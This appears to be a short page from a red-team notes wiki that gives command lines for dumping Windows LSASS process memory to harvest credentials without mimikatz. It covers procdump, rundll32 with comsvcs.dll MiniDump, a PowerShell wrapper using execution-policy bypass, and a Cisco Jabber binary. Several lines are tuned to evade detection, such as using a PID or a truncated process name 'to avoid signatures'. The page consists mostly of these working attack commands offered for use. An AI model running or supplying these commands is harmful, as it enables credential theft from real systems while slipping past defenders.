---
description: Dumping LSASS without mimikatz
---

# Dumping LSASS.exe

## Procdump

Procdump is a Microsoft signed administration tool, not typically flagged. 

```csharp
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Use -r to clone the process prior to duplicating to avoid reading lsass.exe directly
procdump.exe -accepteula -r -ma lsass.exe lsass.dmp

# Use %PID% instead of lsass.exe to avoid string detection
procdump.exe -accepteula -r -ma %PID% FriendlyExport.dmp

# Dynamically get the %PID%
 (ps lsass).id
 (ps ls*).id #cut down to avoid signatures
 
 # combine them all 
 procdump.exe -accepteula -r -ma (ps ls*).id FriendlyExport.dmp
```

## Comsvcs.dll

```text
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %PID% .\Lsass.dump full
```

Can be wrapped in a powershell command too:

```text
Powershell.exe -ep bypass -nop -c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %PID% .\Lsass.dump full
```

## ProcessDump.exe from Cisco Jabber

Cisco Jabber comes with a binary called ProcessDump.exe which can be used like procdump.

Location: C:\Program Files \(x86\)\Cisco Systems\Cisco Jabber\x64\ProcessDump.exe

```text
processdump.exe (ps lsass).id c:\temp\export.dmp
```

## Task Manager

Requires graphical access in addition to administrator rights.

![](../../.gitbook/assets/image%20%284%29.png)

